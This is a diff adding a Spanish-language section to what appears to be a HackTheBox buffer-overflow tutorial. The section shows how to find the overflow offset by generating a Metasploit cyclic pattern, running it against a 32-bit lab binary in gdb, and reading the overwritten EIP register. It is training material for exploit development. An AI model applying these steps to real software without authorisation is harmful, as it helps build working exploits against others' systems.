@@ -177,6 +177,43 @@ fs             0x0	0
 gs             0x63	99
 ```
 
+## Determinar el desplazamiento
+
+El desplazamiento se utiliza para determinar cuántos bytes se necesitan para sobrescribir el búfer y cuánto espacio tenemos alrededor de nuestro shellcode.
+
+#### Crear patrón
+
+```shell-session
+0xRh4ps00dy@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
+0xRh4ps00dy@htb[/htb]$ cat pattern.txt
+
+Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9
+```
+
+#### GDB - Uso de patrones generados
+
+```shell-session
+(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")
+Program received signal SIGSEGV, Segmentation fault.
+0x69423569 in ?? ()
+```
+
+
+#### BGF - EIP
+
+```shell-session
+(gdb) info registers eip
+
+eip            0x69423569	0x69423569
+```
+
+
+
 ## Determine the Length for Shellcode
 
 
